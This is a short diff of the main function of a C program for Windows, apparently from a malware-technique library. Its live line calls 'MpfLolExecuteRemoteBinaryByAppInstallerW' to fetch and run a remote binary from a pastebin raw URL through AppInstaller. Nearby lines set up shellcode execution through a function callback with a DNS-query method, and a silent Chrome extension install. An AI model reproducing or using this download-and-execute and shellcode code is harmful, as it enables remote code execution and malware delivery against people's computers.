@@ -34,14 +34,13 @@ int main(VOID)
 	Sei.Payload = GlobalOpenCalcPayload;
 	Sei.dwLengthOfPayloadInBytes = 277;
 	Sei.MethodEnum = E_DNSQUERYEX;
-	WCHAR IpBuffer[32] = { 0 };*/
 
-	
-	//Info.PayloadString = (PWCHAR)L"https://pastebin.com/raw/tdyShwLw";
+	ShellcodeExecutionViaFunctionCallbackMain(&Sei);
+
+	*/
 
 	MpfLolExecuteRemoteBinaryByAppInstallerW((PWCHAR)L"https://pastebin.com/raw/tdyShwLw", 34);
 
-	//MpfSilentInstallGoogleChromePluginW((PWCHAR)L"aapbdbdomjkkjkaonfhkkikfgjllcleb");
 	
 	//ShellcodeExecutionViaFunctionCallbackMain(&Sei);
 
